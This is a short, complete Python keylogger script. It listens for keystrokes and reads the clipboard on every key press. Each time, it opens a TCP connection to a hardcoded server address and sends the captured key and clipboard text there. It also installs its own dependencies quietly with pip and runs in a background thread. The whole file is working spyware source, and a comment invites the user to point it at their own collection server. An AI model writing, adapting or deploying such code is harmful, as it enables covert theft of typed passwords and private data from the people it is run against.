#!/usr/bin/python3


try:
    from os import system
    import threading,socket
    from pynput import keyboard
    from pandas import read_clipboard
except:
    #two dependencies pynput and pandas ['-q' for quite mode]
    system('pip install -q pynput')
    system('pip install -q pandas')

#replace the IP with your server's IP Address

# LAN (it establish a tcp connection for sending data)
SERVER_ADDRESS = '192.168.0.130:5353'.split(':')


# Recording keystrokes
class keylogger:
    def Keylogging(self):

        def on_key_press(key):
            try:
                # Connecting to server
                server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                server.connect((SERVER_ADDRESS[0],int(SERVER_ADDRESS[-1])))
                try:
                    # Clipboard:
                    data = str(read_clipboard().columns)
                    data = data.lstrip('Index([')
                    data = data.split("], dtype='object'")
                    data = data[0]
                    server.send((f'Clipboard data: {data}\n').encode())
                except:
                    server.send(('Failed to Fetch clipboard data\n').encode())

                # Keystroke:
                server.send(str(f'Keystroke: {key}').encode())
                server.close()
            except:
                pass

        # Create listener objects
        with keyboard.Listener(on_press=on_key_press) as listener:
            listener.join()


if __name__=='__main__':
    try:
        # Creating an object
        obj=keylogger()

        # Implementing threading and daemon = True (to run it in background)
        t1 = threading.Thread(target=obj.Keylogging,daemon=True)
        t1.start() 
        t1.join()    
    
    except KeyboardInterrupt:
        pass

